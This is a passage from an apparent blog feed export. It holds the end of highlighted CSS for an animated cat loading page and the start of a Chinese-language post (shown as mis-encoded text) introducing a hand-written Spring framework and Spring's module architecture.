class="language-css"><span class="hljs-keyword">@-o-keyframes</span> blink &#123;</span><span class="language-css"><span class="hljs-number">0%</span>, <span class="hljs-number">10%</span>, <span class="hljs-number">85%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">bottom</span>: <span class="hljs-number">0</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">30%</span>,</span><span class="language-css"><span class="hljs-number">65%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">bottom</span>: <span class="hljs-number">20px</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">0%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">0.08turn</span>);</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">100%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">1.08turn</span>);</span><span class="language-css">&#125;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-keyword">@keyframes</span> blink &#123;</span><span class="language-css"><span class="hljs-number">0%</span>, <span class="hljs-number">10%</span>, <span class="hljs-number">85%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">bottom</span>: <span class="hljs-number">0</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">30%</span>,</span><span class="language-css"><span class="hljs-number">65%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">bottom</span>: <span class="hljs-number">20px</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">0%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">0.08turn</span>);</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">100%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">1.08turn</span>);</span><span class="language-css">&#125;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> &#123;</span><span class="language-css"><span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;</span><span class="language-css"><span class="hljs-attribute">background</span>: <span class="hljs-number">#5e4674</span>;</span><span class="language-css"><span class="hljs-attribute">overflow</span>: hidden;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> &#123;</span><span class="language-css"><span class="hljs-attribute">position</span>: absolute;</span><span class="language-css"><span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;</span><span class="language-css"><span class="hljs-attribute">bottom</span>: <span class="hljs-number">8%</span>;</span><span class="language-css"><span class="hljs-attribute">width</span>: <span class="hljs-number">260px</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">260px</span>;</span><span class="language-css"><span class="hljs-attribute">margin-left</span>: -<span class="hljs-number">130px</span>;</span><span class="language-css"><span class="hljs-attribute">margin-top</span>: -<span class="hljs-number">130px</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.track</span> &#123;</span><span class="language-css"><span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;</span><span class="language-css"><span class="hljs-attribute">border</span>: solid <span class="hljs-number">#251c1c</span>;</span><span class="language-css"><span class="hljs-attribute">border-width</span>: <span class="hljs-number">5px</span> <span class="hljs-number">5px</span> <span class="hljs-number">3px</span> <span class="hljs-number">0</span>;</span><span class="language-css"><span class="hljs-attribute">border-top-color</span>: transparent;</span><span class="language-css"><span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50%</span>;</span><span class="language-css"><span class="hljs-attribute">margin-left</span>: -<span class="hljs-number">3px</span>;</span><span class="language-css"><span class="hljs-attribute">margin-top</span>: -<span class="hljs-number">3px</span>;</span><span class="language-css">-webkit-<span class="hljs-attribute">animation</span>: rotate <span class="hljs-number">3s</span> infinite linear;</span><span class="language-css">-moz-<span class="hljs-attribute">animation</span>: rotate <span class="hljs-number">3s</span> infinite linear;</span><span class="language-css">-o-<span class="hljs-attribute">animation</span>: rotate <span class="hljs-number">3s</span> infinite linear;</span><span class="language-css"><span class="hljs-attribute">animation</span>: rotate <span class="hljs-number">3s</span> infinite linear;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.track</span> <span class="hljs-selector-class">.mouse</span> &#123;</span><span class="language-css"><span class="hljs-attribute">position</span>: absolute;</span><span class="language-css"><span class="hljs-attribute">right</span>: <span class="hljs-number">31px</span>;</span><span class="language-css"><span class="hljs-attribute">top</span>: <span class="hljs-number">18px</span>;</span><span class="language-css"><span class="hljs-attribute">width</span>: <span class="hljs-number">25px</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">25px</span>;</span><span class="language-css"><span class="hljs-attribute">background</span>: <span class="hljs-number">#251c1c</span>;</span><span class="language-css"><span class="hljs-attribute">border-radius</span>: <span class="hljs-number">80%</span> <span class="hljs-number">0</span> <span class="hljs-number">55%</span> <span class="hljs-number">50%</span> / <span class="hljs-number">55%</span> <span class="hljs-number">0</span> <span class="hljs-number">80%</span> <span class="hljs-number">50%</span>;</span><span class="language-css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">95deg</span>);</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.track</span> <span class="hljs-selector-class">.mouse</span><span class="hljs-selector-pseudo">:before</span>,</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.track</span> <span class="hljs-selector-class">.mouse</span><span class="hljs-selector-pseudo">:after</span> &#123;</span><span class="language-css"><span class="hljs-attribute">position</span>: absolute;</span><span class="language-css"><span class="hljs-attribute">content</span>: <span class="hljs-string">&#x27;&#x27;</span>;</span><span class="language-css"><span class="hljs-attribute">width</span>: <span class="hljs-number">9px</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">9px</span>;</span><span class="language-css"><span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50%</span>;</span><span class="language-css"><span class="hljs-attribute">background</span>: inherit;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.track</span> <span class="hljs-selector-class">.mouse</span><span class="hljs-selector-pseudo">:before</span> &#123;</span><span class="language-css"><span class="hljs-attribute">left</span>: <span class="hljs-number">5px</span>;</span><span class="language-css"><span class="hljs-attribute">top</span>: -<span class="hljs-number">4px</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.track</span> <span class="hljs-selector-class">.mouse</span><span class="hljs-selector-pseudo">:after</span> &#123;</span><span class="language-css"><span class="hljs-attribute">left</span>: <span class="hljs-number">20px</span>;</span><span class="language-css"><span class="hljs-attribute">top</span>: <span class="hljs-number">11px</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span> &#123;</span><span class="language-css"><span class="hljs-attribute">position</span>: absolute;</span><span class="language-css"><span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;</span><span class="language-css"><span class="hljs-attribute">top</span>: <span class="hljs-number">50%</span>;</span><span class="language-css"><span class="hljs-attribute">width</span>: <span class="hljs-number">130px</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">130px</span>;</span><span class="language-css"><span class="hljs-attribute">margin-left</span>: -<span class="hljs-number">65px</span>;</span><span class="language-css"><span class="hljs-attribute">margin-top</span>: -<span class="hljs-number">65px</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span><span class="hljs-selector-pseudo">:before</span>,</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span><span class="hljs-selector-pseudo">:after</span> &#123;</span><span class="language-css"><span class="hljs-attribute">position</span>: absolute;</span><span class="language-css"><span class="hljs-attribute">content</span>: <span class="hljs-string">&#x27;&#x27;</span>;</span><span class="language-css"><span class="hljs-attribute">width</span>: <span class="hljs-number">50%</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span><span class="hljs-selector-pseudo">:before</span> &#123;</span><span class="language-css"><span class="hljs-attribute">background</span>: <span class="hljs-number">#c8c6c9</span>;</span><span class="language-css"><span class="hljs-attribute">border-top-left-radius</span>: <span class="hljs-number">65px</span>;</span><span class="language-css"><span class="hljs-attribute">border-bottom-left-radius</span>: <span class="hljs-number">55px</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span><span class="hljs-selector-pseudo">:after</span> &#123;</span><span class="language-css"><span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;</span><span class="language-css"><span class="hljs-attribute">background</span>: <span class="hljs-number">#d0ced1</span>;</span><span class="language-css"><span class="hljs-attribute">border-top-right-radius</span>: <span class="hljs-number">65px</span>;</span><span class="language-css"><span class="hljs-attribute">border-bottom-right-radius</span>: <span class="hljs-number">55px</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span> <span class="hljs-selector-class">.ears-container</span> &#123;</span><span class="language-css"><span class="hljs-attribute">position</span>: absolute;</span><span class="language-css"><span class="hljs-attribute">top</span>: -<span class="hljs-number">8px</span>;</span><span class="language-css"><span class="hljs-attribute">width</span>: <span class="hljs-number">130px</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">50px</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span> <span class="hljs-selector-class">.ears-container</span><span class="hljs-selector-pseudo">:before</span>,</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span> <span class="hljs-selector-class">.ears-container</span><span class="hljs-selector-pseudo">:after</span> &#123;</span><span class="language-css"><span class="hljs-attribute">position</span>: absolute;</span><span class="language-css"><span class="hljs-attribute">content</span>: <span class="hljs-string">&#x27;&#x27;</span>;</span><span class="language-css"><span class="hljs-attribute">width</span>: <span class="hljs-number">0</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">0</span>;</span><span class="language-css"><span class="hljs-attribute">border-top</span>: <span class="hljs-number">35px</span> solid transparent;</span><span class="language-css"><span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">35px</span> solid transparent;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span> <span class="hljs-selector-class">.ears-container</span><span class="hljs-selector-pseudo">:before</span> &#123;</span><span class="language-css"><span class="hljs-attribute">border-left</span>: <span class="hljs-number">35px</span> solid <span class="hljs-number">#c8c6c9</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span> <span class="hljs-selector-class">.ears-container</span><span class="hljs-selector-pseudo">:after</span> &#123;</span><span class="language-css"><span class="hljs-attribute">right</span>: <span class="hljs-number">0</span>;</span><span class="language-css"><span class="hljs-attribute">border-right</span>: <span class="hljs-number">35px</span> solid <span class="hljs-number">#c8c6c9</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span> <span class="hljs-selector-class">.eyes-container</span> &#123;</span><span class="language-css"><span class="hljs-attribute">position</span>: absolute;</span><span class="language-css"><span class="hljs-attribute">overflow</span>: hidden;</span><span class="language-css"><span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;</span><span class="language-css"><span class="hljs-attribute">top</span>: <span class="hljs-number">30px</span>;</span><span class="language-css"><span class="hljs-attribute">width</span>: <span class="hljs-number">106px</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">50px</span>;</span><span class="language-css"><span class="hljs-attribute">margin-left</span>: -<span class="hljs-number">53px</span>;</span><span class="language-css"><span class="hljs-attribute">z-index</span>: <span class="hljs-number">1</span>;</span><span class="language-css">-webkit-<span class="hljs-attribute">animation</span>: hideEye <span class="hljs-number">3s</span> infinite linear;</span><span class="language-css">-moz-<span class="hljs-attribute">animation</span>: hideEye <span class="hljs-number">3s</span> infinite linear;</span><span class="language-css">-o-<span class="hljs-attribute">animation</span>: hideEye <span class="hljs-number">3s</span> infinite linear;</span><span class="language-css"><span class="hljs-attribute">animation</span>: hideEye <span class="hljs-number">3s</span> infinite linear;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span> <span class="hljs-selector-class">.eyes-container</span> <span class="hljs-selector-class">.eye</span> &#123;</span><span class="language-css"><span class="hljs-attribute">position</span>: relative;</span><span class="language-css"><span class="hljs-attribute">bottom</span>: <span class="hljs-number">0</span>;</span><span class="language-css"><span class="hljs-attribute">float</span>: left;</span><span class="language-css"><span class="hljs-attribute">width</span>: <span class="hljs-number">50px</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">50px</span>;</span><span class="language-css"><span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50%</span>;</span><span class="language-css"><span class="hljs-attribute">color</span>: <span class="hljs-number">#c8c6c9</span>;</span><span class="language-css"><span class="hljs-attribute">background</span>: white;</span><span class="language-css">-webkit-<span class="hljs-attribute">animation</span>: blink <span class="hljs-number">3s</span> infinite linear;</span><span class="language-css">-moz-<span class="hljs-attribute">animation</span>: blink <span class="hljs-number">3s</span> infinite linear;</span><span class="language-css">-o-<span class="hljs-attribute">animation</span>: blink <span class="hljs-number">3s</span> infinite linear;</span><span class="language-css"><span class="hljs-attribute">animation</span>: blink <span class="hljs-number">3s</span> infinite linear;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span> <span class="hljs-selector-class">.eyes-container</span> <span class="hljs-selector-class">.eye</span><span class="hljs-selector-pseudo">:after</span> &#123;</span><span class="language-css"><span class="hljs-attribute">position</span>: absolute;</span><span class="language-css"><span class="hljs-attribute">content</span>: <span class="hljs-string">&#x27;&#x27;</span>;</span><span class="language-css"><span class="hljs-attribute">top</span>: <span class="hljs-number">4px</span>;</span><span class="language-css"><span class="hljs-attribute">right</span>: <span class="hljs-number">14px</span>;</span><span class="language-css"><span class="hljs-attribute">width</span>: <span class="hljs-number">12px</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">12px</span>;</span><span class="language-css"><span class="hljs-attribute">border-radius</span>: inherit;</span><span class="language-css"><span class="hljs-attribute">background</span>: <span class="hljs-number">#838091</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span> <span class="hljs-selector-class">.eyes-container</span> <span class="hljs-selector-class">.eye</span><span class="hljs-selector-pseudo">:last-child</span> &#123;</span><span class="language-css"><span class="hljs-attribute">float</span>: right;</span><span class="language-css"><span class="hljs-attribute">color</span>: <span class="hljs-number">#d0ced1</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span> <span class="hljs-selector-class">.phiz</span> &#123;</span><span class="language-css"><span class="hljs-attribute">position</span>: absolute;</span><span class="language-css"><span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;</span><span class="language-css"><span class="hljs-attribute">top</span>: <span class="hljs-number">66px</span>;</span><span class="language-css"><span class="hljs-attribute">width</span>: <span class="hljs-number">32px</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">48px</span>;</span><span class="language-css"><span class="hljs-attribute">margin-left</span>: -<span class="hljs-number">16px</span>;</span><span class="language-css"><span class="hljs-attribute">z-index</span>: <span class="hljs-number">1</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span> <span class="hljs-selector-class">.phiz</span> <span class="hljs-selector-class">.nose</span> &#123;</span><span class="language-css"><span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">15px</span>;</span><span class="language-css"><span class="hljs-attribute">border-top-left-radius</span>: <span class="hljs-number">5px</span>;</span><span class="language-css"><span class="hljs-attribute">border-top-right-radius</span>: <span class="hljs-number">5px</span>;</span><span class="language-css"><span class="hljs-attribute">border-bottom-left-radius</span>: <span class="hljs-number">25px</span>;</span><span class="language-css"><span class="hljs-attribute">border-bottom-right-radius</span>: <span class="hljs-number">25px</span>;</span><span class="language-css"><span class="hljs-attribute">background</span>: <span class="hljs-number">#838091</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span> <span class="hljs-selector-class">.phiz</span> <span class="hljs-selector-class">.lip</span> &#123;</span><span class="language-css"><span class="hljs-attribute">position</span>: relative;</span><span class="language-css"><span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;</span><span class="language-css"><span class="hljs-attribute">width</span>: <span class="hljs-number">4px</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">12px</span>;</span><span class="language-css"><span class="hljs-attribute">margin-left</span>: -<span class="hljs-number">2px</span>;</span><span class="language-css"><span class="hljs-attribute">background</span>: <span class="hljs-number">#838091</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span> <span class="hljs-selector-class">.phiz</span> <span class="hljs-selector-class">.lip</span><span class="hljs-selector-pseudo">:before</span> &#123;</span><span class="language-css"><span class="hljs-attribute">position</span>: absolute;</span><span class="language-css"><span class="hljs-attribute">content</span>: <span class="hljs-string">&#x27;&#x27;</span>;</span><span class="language-css"><span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">5px</span>;</span><span class="language-css"><span class="hljs-attribute">background</span>: <span class="hljs-number">#767385</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span> <span class="hljs-selector-class">.phiz</span> <span class="hljs-selector-class">.mouth</span> &#123;</span><span class="language-css"><span class="hljs-attribute">position</span>: relative;</span><span class="language-css"><span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;</span><span class="language-css"><span class="hljs-attribute">width</span>: <span class="hljs-number">20px</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">6px</span>;</span><span class="language-css"><span class="hljs-attribute">margin-left</span>: -<span class="hljs-number">13px</span>;</span><span class="language-css"><span class="hljs-attribute">background</span>: white;</span><span class="language-css"><span class="hljs-attribute">border</span>: <span class="hljs-number">3px</span> solid <span class="hljs-number">#838091</span>;</span><span class="language-css"><span class="hljs-attribute">border-bottom-right-radius</span>: <span class="hljs-number">12px</span>;</span><span class="language-css"><span class="hljs-attribute">border-bottom-left-radius</span>: <span class="hljs-number">12px</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-keyword">@media</span> screen <span class="hljs-keyword">and</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">900px</span>)&#123;</span><span class="language-css"><span class="hljs-selector-tag">h1</span> &#123;<span class="hljs-attribute">font-size</span>: <span class="hljs-number">100px</span>;&#125;</span><span class="language-css"><span class="hljs-selector-class">.btn</span> &#123;<span class="hljs-attribute">width</span>: <span class="hljs-number">50%</span>;&#125;</span><span class="language-css"></span><span class="language-css">&#125;</span><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div></li><li><p>æ¦‚è§ˆ</p><p><img src="https://img-blog.csdnimg.cn/9e063cb390b94866ba886c40317ccfc3.png" alt="è¯·æ·»åŠ å›¾ç‰‡æè¿°"></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>æ‰‹å†™spring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æš‘å‡æœ€åå‡ å¤©ï¼è‚çˆ†ï¼ˆæ‰‹å†™ï¼‰ä¸€ä¸ªSpringä¹‹Day1</title>
    <link href="/2022/08/13/spring_day01/"/>
    <url>/2022/08/13/spring_day01/</url>
    
    <content type="html"><![CDATA[<h1 id="Day01â€”Springé¢„çƒ­"><a href="#Day01â€”Springé¢„çƒ­" class="headerlink" title="Day01â€”Springé¢„çƒ­"></a>Day01â€”Springé¢„çƒ­</h1><p>å·²ç»å®Œæˆäº†åŸºæœ¬ï¼Œä»£ç åœ°å€</p><p>Github:<a href="https://github.com/luelueking/My_Spring_Source">https://github.com/luelueking/My_Spring_Source</a></p><p>Gitee:<a href="https://gitee.com/luelueking/My_Spring_Source">https://gitee.com/luelueking/My_Spring_Source</a></p><p>ä¸åºŸè¯ï¼Œç›´æ¥è¿›å…¥æ­£æ–‡ï¼ï¼ï¼</p><p>[TOC]</p><h2 id="Springçš„è®¾è®¡åˆè¡·"><a href="#Springçš„è®¾è®¡åˆè¡·" class="headerlink" title="Springçš„è®¾è®¡åˆè¡·"></a>Springçš„è®¾è®¡åˆè¡·</h2><ul><li>æ ¹æœ¬ä½¿å‘½ï¼š<strong>ç®€åŒ–å¼€å‘</strong></li><li>4ä¸ªå…³é”®ç­–ç•¥ï¼ˆå¦‚ä½•å®Œæˆä½¿å‘½ï¼‰ï¼š<ul><li>åŸºäºPOJOçš„è½»é‡çº§å’Œæœ€å°ä¾µå…¥æ€§ç¼–ç¨‹</li><li>é€šè¿‡ä¾èµ–æ³¨å…¥å’Œé¢å‘æ¥å£å®ç°æ¾è€¦åˆ</li><li>åŸºäºåˆ‡é¢å’Œæƒ¯æ€§è¿›è¡Œå£°æ˜å¼ç¼–ç¨‹</li><li>é€šè¿‡åˆ‡é¢å’Œæ¨¡ç‰ˆå‡å°‘æ ·ç‰ˆå¼ä»£ç </li></ul></li><li>é€šè¿‡é¢ç›¸Bean(BOP)ã€ä¾èµ–æ³¨å…¥(DI)åŠé¢å‘åˆ‡é¢(AOP)è¿™ä¸‰ç§æ–¹å¼å…‘ç°å¹è¿‡çš„ğŸ®</li></ul><h2 id="Springçš„ç³»ç»Ÿæ¶æ„"><a href="#Springçš„ç³»ç»Ÿæ¶æ„" class="headerlink" title="Springçš„ç³»ç»Ÿæ¶æ„"></a>Springçš„ç³»ç»Ÿæ¶æ„</h2><ul><li><p>æ ¸å¿ƒå®¹å™¨</p><ul><li>spring-beanså’Œspring-coreï¼šspringçš„æ ¸å¿ƒæ¨¡å—ï¼ŒåŒ…å«äº†æ§åˆ¶åè½¬ï¼ˆIoCï¼‰å’Œä¾èµ–æ³¨å…¥ï¼ˆDIï¼‰ã€‚<ul><li>BeanFactoryç”¨IoCå¯¹åº”ç”¨ç¨‹åºçš„é…ç½®å’Œä¾èµ–æ€§è§„èŒƒä¸å®é™…çš„åº”ç”¨ç¨‹åºä»£ç è¿›è¡Œåˆ†ç¦»ã€‚</li><li>æ³¨ï¼šBeanFactoryå®ä¾‹åŒ–åå¹¶ä¸ä¼šå®ä¾‹åŒ–Bean</li></ul></li><li>spring-contextï¼šæ„å»ºäºæ ¸å¿ƒæ¨¡å—ä¹‹ä¸Šï¼Œæ‰©å±•äº†BeanFactoryï¼Œä¸ºå®ƒæ·»åŠ äº†Beanç”Ÿå‘½å‘¨æœŸæ§åˆ¶ã€æ¡†æ¶äº‹ä»¶ä½“ç³»åŠèµ„æºåŠ è½½é€æ˜åŒ–ç­‰åŠŸèƒ½ã€‚<ul><li>ApplicationContextæ˜¯è¯¥æ¨¡å—çš„æ ¸å¿ƒæ¥å£ï¼Œå…¶è¶…ç±»æ˜¯BeanFactory,ä¸åŒç‚¹åœ¨äºApplicationContextå®ä¾‹åŒ–åè‡ªåŠ¨åŒ–å¯¹æ‰€æœ‰çš„å•å®ä¾‹Beanè¿›è¡Œå®ä¾‹åŒ–ä¸ä¾èµ–å…³ç³»çš„è£…é…ï¼Œä½¿ä¹‹å¤„äºå¾…ç”¨çŠ¶æ€ã€‚</li></ul></li><li>Spring-context-supportï¼šå¯¹SpringIoCå®¹å™¨åŠIoCå­å®¹å™¨çš„æ‰©å±•æ”¯æŒ</li><li>Spring-context-indexerï¼šSpringç±»çš„ç®¡ç†ç»„ä»¶å’ŒClasspathæ‰«æç»„ä»¶</li><li>Spring-expressionï¼šç»Ÿä¸€è¡¨è¾¾å¼è¯­è¨€(EL)çš„æ‰©å±•ï¼Œå¯ä»¥æŸ¥è¯¢ã€ç®¡ç†è¿è¡Œä¸­çš„å¯¹è±¡ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥æ–¹ä¾¿çš„è°ƒç”¨å¯¹è±¡æ–¹æ³•ã€ä»¥åŠæ“ä½œæ•°ç»„ã€é›†åˆç­‰ã€‚</li></ul></li><li><p>AOPå’Œè®¾å¤‡æ”¯æŒ</p><ul><li>spring-aopï¼šå¦ä¸€ä¸ªæ ¸å¿ƒæ¨¡å—ï¼ŒAOPä¸»è¦å®ç°æ¨¡å—ã€‚</li><li>spring-aspectsï¼šé›†æˆè‡ªAspectJæ¡†æ¶ï¼Œä¸»è¦ä¸ºSpingæä¾›å¤šç§AOPå®ç°æ–¹æ³•ã€‚</li><li>spring-instrumentï¼šåŸºäºJavaSEä¸­çš„java.lang.instrumentè¿›è¡Œè®¾è®¡çš„,åº”è¯¥ç®—æ˜¯AOPçš„ä¸€ä¸ªæ”¯æ´æ¨¡å—ï¼Œä¸»è¦ä½œç”¨æ˜¯JVMå¯ç”¨æ—¶ç”Ÿæˆçš„ä¸€ä¸ªä»£ç†ç±»ã€‚</li></ul></li><li><p>æ•°æ®è®¿é—®ä¸é›†æˆ</p><ul><li>spring-jdbcï¼šSpringæä¾›çš„JDBCæŠ½è±¡æ¡†æ¶çš„ä¸»è¦å®ç°æ¨¡å—ï¼Œç”¨äºç®€åŒ–Spring JDBCæ“ä½œã€‚</li><li>spring-txï¼šSpring JDBCäº‹åŠ¡æ§åˆ¶å®ç°æ¨¡å—ã€‚</li><li>spring-ormï¼šORMæ¡†æ¶æ”¯æŒæ¨¡å—ï¼Œä¸»è¦é›†æˆHibernate,Java Persistence API(JPA)å’ŒJava Data Objects(JDO)ç”¨äºèµ„æºç®¡ç†ã€æ•°æ®è®¿é—®å¯¹è±¡çš„å®ç°å’Œäº‹åŠ¡ç­–ç•¥ã€‚</li><li>spring-oxmï¼šæä¾›ä¸€ä¸ªæŠ½è±¡å±‚ä»¥æ”¯æ’‘OXMï¼ˆObjectå’ŒXMLçš„æ˜ å°„ï¼‰</li><li>spring-jmsï¼šèƒ½å¤Ÿå‘é€å’Œæ¥å—ä¿¡æ¯</li></ul></li><li><p>Webç»„ä»¶</p><ul><li>spring-webï¼šSpringæä¾›çš„æœ€åŸºç¡€çš„Webæ”¯æŒï¼Œä¸»è¦ç®€å†åœ¨æ ¸å¿ƒå®¹å™¨ä¹‹ä¸Šï¼Œé€šè¿‡Servletæˆ–è€…Listenersæ¥åˆå§‹åŒ–Iocå®¹å™¨ï¼Œä¹ŸåŒ…å«ä¸€äº›ä¸Webç›¸å…³çš„æ”¯æŒã€‚</li><li>spring-webmvcï¼šSpring MVC</li><li>spring-websocketï¼šä¸Webå‰ç«¯è¿›è¡Œå…¨åŒå·¥é€šä¿¡çš„åè®®ã€‚</li><li>spring-webfluxï¼šä¸€ä¸ªæ–°çš„éå µå¡å‡½æ•°å¼Reactive Webæ¡†æ¶ï¼Œå¯ä»¥ç”¨æ¥æ„å»ºå¼‚æ­¥çš„ã€éé˜»å¡çš„ã€äº‹ä»¶é©±åŠ¨çš„æœåŠ¡ã€æ‰©å±•æ€§éå¸¸å¥½ã€‚</li></ul></li><li><p>é€šä¿¡æŠ¥æ–‡</p><ul><li>spring-messageï¼šä¸ºSpringæ¡†æ¶é›†æˆä¸€äº›åŸºç¡€çš„æŠ¥æ–‡ä¼ 